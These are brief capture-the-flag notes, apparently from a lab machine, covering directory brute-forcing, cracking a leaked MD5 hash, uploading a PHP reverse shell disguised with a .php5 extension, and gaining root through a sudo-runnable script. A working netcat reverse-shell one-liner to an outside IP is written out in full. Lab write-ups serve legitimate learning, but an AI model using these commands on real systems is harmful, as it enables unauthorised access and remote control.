## Gaining Access 😉

- gobuster directory bruteforce
- got a directory called content
- gobuster directory bruteforce on subdirectory content. got a break through
- one of the subdirectory contains sql backup
	- just searched passwd on the file 
	- got an md5 hashed password
	- cracked with crackstation
- uploaded a php reverse shell on mediacentre
	- used .php5 to bypass .php filteration



## Maintaining Access 🥷
- sudo -l
- perl script found with rws permission which runs copy.sh
- nc reverse shell pasted to copy.sh & ran script with sudo
- reconnected


## Important commands 🔥
- nc rev shell
	```nc
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.229.254 2222 >/tmp/f
	```

## Post Exploitation ✴️
- User flag : /home/user
- Root flag : /root/root
## Tips 💡
- if you messed up on gainig access, just bruteforce sub directories for a break through
- bruteforcing sub directories
